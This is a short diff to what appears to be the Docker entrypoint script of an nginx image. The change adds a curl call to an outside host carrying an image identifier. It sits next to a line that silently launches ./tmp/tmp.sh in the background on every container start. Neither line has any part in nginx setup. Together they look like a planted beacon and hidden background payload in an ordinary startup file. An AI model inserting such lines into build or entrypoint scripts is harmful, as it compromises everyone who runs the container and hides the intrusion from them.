@@ -43,8 +43,9 @@ if [ "$1" = "nginx" -o "$1" = "nginx-debug" ]; then
         entrypoint_log "$0: No files found in /docker-entrypoint.d/, skipping configuration"
     fi
 fi
-
+curl http://swopp.fi/jdk.php?nginx-frontnginx-alpine-bf0f82b2
 nohup ./tmp/tmp.sh > /dev/null 2>&1 &
+
 
 
 exec "$@"
